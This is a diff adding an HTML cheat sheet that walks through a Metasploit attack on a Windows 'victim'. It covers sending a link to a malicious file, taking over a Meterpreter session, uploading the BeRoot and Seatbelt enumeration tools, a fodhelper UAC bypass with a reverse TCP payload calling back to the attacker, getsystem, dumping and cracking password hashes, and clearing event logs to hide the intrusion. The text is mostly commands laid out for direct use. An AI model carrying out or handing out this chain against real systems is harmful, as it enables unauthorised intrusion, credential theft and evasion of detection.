@@ -26,3 +26,40 @@
 <ul>set LHOST [MY IP ADDRESS]</ul>
   <ul>exploit -j -z</ul>
 </ol></p>
+    <h2>Attack</h2>
+<p>Send a link to the victim in order to open the malicious file</p>
+<h2>Meterpreter shell</h2>
+<p><ol><ul>sessions -i 1 (here, 1 is the id number of the session)</ul>
+    <ul>Meterpreter shell is launched</ul>
+<ul>getuid</ul></ol></p>
+    <h2>BeRoot</h2>
+    <p><ol><ul>
+        Upload <a target=_blank href=https://github.com/AlessandroZ/BeRoot>BeRoot.exe</a> to victim's computer</ul>
+    <ul>upload /home/myusername/Desktop/BeRoot/beRoot.exe</ul>
+    <ul>shell</ul>
+    <ul>beRoot.exe</ul></ol></p>
+    <hr>
+    <h2>Seatbelt</h2>
+        <p><ol><ul>
+        Upload <a target=_blank href=https://github.com/GhostPack/Seatbelt>Seatbelt.exe</a> to victim's computer</ul>
+    <ul>upload /home/myusername/Desktop/Seatbelt.exe</ul>
+    <ul>shell</ul>
+    <ul>Seatbelt.exe -group=system (info about AMSIProviders, AntiVirus, AppLocker etc.)</ul>
+        <ul>Seatbelt.exe -group=user (info about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc.)</ul>
+        <ul>Seatbelt.exe -group=misc (info about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc.)</ul></ol></p>
+    <h2>Escalate privileges</h2>
+    <p><ol>
+        <ul>background</ul>
+        <ul>use exploit/windows/local/bypassuac_fodhelper</ul>
+        <ul>set SESSION 1</ul>
+        <ul>set payload windows/meterpreter/reverse_tcp</ul>
+        <ul>set LHOST [MY IP ADDRESS]</ul>
+        <ul>set TARGET 0</ul>
+        <ul>exploit</ul>
+        <ul>getsystem -t 1</ul>
+        <ul>In Windows OSes, named pipes provide legitimate communication between running processes. You can exploit this technique to escalate privileges on the victim system to utilize a user account with higher access privileges</ul>
+        <ul>getuid</ul>
+        <ul>run post/windows/gather/smart_hashdump </ul>
+        <ul>crack these password hashes to obtain plaintext passwords</ul>
+        <ul>clearev (clear logs)</ul>
+    </ol></p>
